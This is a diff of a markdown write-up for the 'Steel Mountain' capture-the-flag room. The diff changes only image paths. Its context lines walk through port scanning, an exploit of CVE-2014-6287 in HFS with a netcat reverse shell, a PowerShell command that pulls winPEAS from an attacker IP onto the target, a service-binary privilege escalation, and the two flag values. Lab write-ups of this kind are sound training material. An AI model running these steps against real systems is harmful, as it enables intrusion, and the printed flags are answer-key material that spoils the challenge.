@@ -1,6 +1,6 @@
 # Steel Mountain
 
-![room_done.png](Steel%20Mountain/room_done.png)
+![room_done.png](room_done.png)
 
 # Intro
 
@@ -50,7 +50,7 @@ PORT      STATE SERVICE       VERSION
 
 **2- main page**
 
-![port80_1.png](Steel%20Mountain/port80_1.png)
+![port80_1.png](port80_1.png)
 
 First question: Who is the employee of the month?
 
@@ -60,13 +60,13 @@ step 2: lets download the image and analyze it maybe contains anything reveals t
 
 before i analyze anything i noticed the name of the image and it reveals the answer.
 
-![port80_2.png](Steel%20Mountain/port80_2.png)
+![port80_2.png](port80_2.png)
 
 ## PORT 445 SMB
 
 SMB seems to be secure but the only thing can be documented that there is no rate limiting so anyone can brute force the username and password
 
-![port445_1.png](Steel%20Mountain/port445_1.png)
+![port445_1.png](port445_1.png)
 
 ## PORT 3389 RDP
 
@@ -85,7 +85,7 @@ and there is no rate limiting + connecting to the target via rdp reveals the ver
 
 **Windows 8.1 or Windows Server 2012 R2 Build 9600**
 
-![port3389_1.png](Steel%20Mountain/port3389_1.png)
+![port3389_1.png](port3389_1.png)
 
 ## Port 5985 **WinRM HTTP**
 
@@ -105,15 +105,15 @@ This is totally vulnerable to **CVE-2014-6287 has a critical RCE**
 
 **1- copy the payload** 
 
-![Payload_cop.png](Steel%20Mountain/Payload_cop.png)
+![Payload_cop.png](Payload_cop.png)
 
 **2- To exploit you need to start a listener and HTTP server that hosts a `nc.exe` also you will edit the payload to change the LHOST AND LPORT of NETCAT The run the payload 2 times and your shell will be spawned.**
 
-![port8080_1_exploit.png](Steel%20Mountain/port8080_1_exploit.png)
+![port8080_1_exploit.png](port8080_1_exploit.png)
 
 **FLAG1: b04763b6fcf51fcd7c13abc7db4fd365**
 
-![flag1.png](Steel%20Mountain/flag1.png)
+![flag1.png](flag1.png)
 
 # Post-Exploitation
 
@@ -127,7 +127,7 @@ command used:
 powershell -c "Invoke-WebRequest -Uri http://192.168.160.149:80/winPEASx64.exe -OutFile winpeas.exe"
 ```
 
-![winpeas.png](Steel%20Mountain/winpeas.png)
+![winpeas.png](winpeas.png)
 
 **WinPeas located a potential Priv esc vector**
 
@@ -138,7 +138,7 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.160.149:80/winPEASx64.exe -
 - **Permissions**: User `bill` has **WriteData/CreateFiles** permissions in the folder.
 - **Possible Attack**: DLL hijacking in the binary folder.
 
-![winpeas_2.png](Steel%20Mountain/winpeas_2.png)
+![winpeas_2.png](winpeas_2.png)
 
 ## Privilege Escalation
 
@@ -169,9 +169,9 @@ sc stop AdvancedSystemCareService9
 sc start AdvancedSystemCareService9
 ```
 
-![exploit_4.png](Steel%20Mountain/exploit_4.png)
+![exploit_4.png](exploit_4.png)
 
-![exploit_3.png](Steel%20Mountain/exploit_3.png)
+![exploit_3.png](exploit_3.png)
 
 **Step5: Check the other tab that has the listener** 
 
@@ -179,6 +179,6 @@ sc start AdvancedSystemCareService9
 
 **Now i will grab the root flag**
 
-![flag2.png](Steel%20Mountain/flag2.png)
+![flag2.png](flag2.png)
 
 FLAG2: 9af5f314f57607c00fd09803a587db80
